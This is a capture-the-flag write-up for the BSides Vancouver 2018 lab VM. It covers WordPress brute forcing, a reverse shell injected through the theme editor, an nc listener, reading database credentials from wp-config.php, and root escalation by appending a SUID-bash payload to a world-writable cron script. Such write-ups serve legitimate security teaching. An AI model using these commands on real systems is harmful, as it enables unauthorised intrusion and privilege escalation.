# Writeup: BSides Vancouver 2018 (Workshop)

* **Target IP:** 192.168.56.112
* **Attacker IP:** 192.168.56.102
* **Difficulty:** Beginner
* **Flag:** `/root/flag.txt`

---

## 1. Reconnaissance & Enumeration

### Service Scanning

A full `nmap` scan revealed three open ports:

* **21 (FTP):** vsftpd 2.3.5 (Anonymous allowed).
* **22 (SSH):** OpenSSH 5.9p1.
* **80 (HTTP):** Apache 2.2.22.

### Credential Harvesting

1. **FTP:** Accessed via anonymous login. Downloaded `users.txt.bk`, which provided a list of usernames: `abatchy`, `john`, `mai`, `anne`, `doomguy`.
2. **WordPress:** Located at `/backup_wordpress/`.
3. **WPScan:** Performed a brute-force attack using the FTP username list and `rockyou.txt`.
* **Result:** `john : enigma`



---

## 2. Exploitation (Initial Access)

I bypassed automated exploits and used the **WordPress Theme Editor** for manual code execution:

1. Log in to the dashboard as `john`.
2. Edit `Appearance > Editor > 404.php` (Twenty Fourteen theme).
3. Injected a [Pentestmonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) configured to my IP and port 1234.
4. Triggered the shell via browser.

### Post-Exploitation Commands (The Breakdown)

Once the connection was caught with `nc -lvnp 1234`, the following stabilization and enumeration steps were taken:

#### A. Shell Stabilization (TTY Upgrade)

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# [Ctrl+Z]
stty raw -echo; fg

```

* **Why:** Initial shells are "dumb"—they lack Tab-completion, job control, and text editors (like nano) break them.
* **How it works:** Python spawns a pseudo-terminal (PTY). The `stty` command tells my local machine to pass raw keyboard input directly to the target, and `fg` brings the session back to the foreground with full functionality.

#### B. System Enumeration

1. **Database Discovery:**
```bash
cat /var/www/backup_wordpress/wp-config.php | grep 'DB_PASSWORD'

```


* **Result:** Found `thiscannotbeit`. I tested this password for users `john` and `abatchy`, but access was denied.


2. **SUID Search:**
```bash
find / -perm -u=s -type f 2>/dev/null

```


* **Why:** I checked for binaries that run with root privileges. Found `pkexec` and `sudo`, but looked for an easier vector first.



---

## 3. Privilege Escalation

### Vector Identification

Checking the system-wide crontab:

```bash
cat /etc/crontab

```

Identified a cronjob running as root: `* * * * * root /usr/local/bin/cleanup`.
Verification of file permissions:

```bash
ls -l /usr/local/bin/cleanup # Result: -rwxrwxrwx

```

The script was **world-writable (777)**, a critical misconfiguration.

### Exploitation

I injected a payload into the cleanup script to create a SUID bash binary:

```bash
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /usr/local/bin/cleanup

```

* **`cp /bin/bash /tmp/rootbash`**: Copies the shell to a writable directory.
* **`chmod +s`**: Sets the SUID bit, meaning the file will run as its owner (root).

Wait 60 seconds for the cronjob, then execute:

```bash
/tmp/rootbash -p

```

* **`-p`**: Essential flag to prevent Bash from dropping its effective root privileges.

---

## 4. Final Flag

Successfully obtained root access and read the flag:

```bash
cat /root/flag.txt

```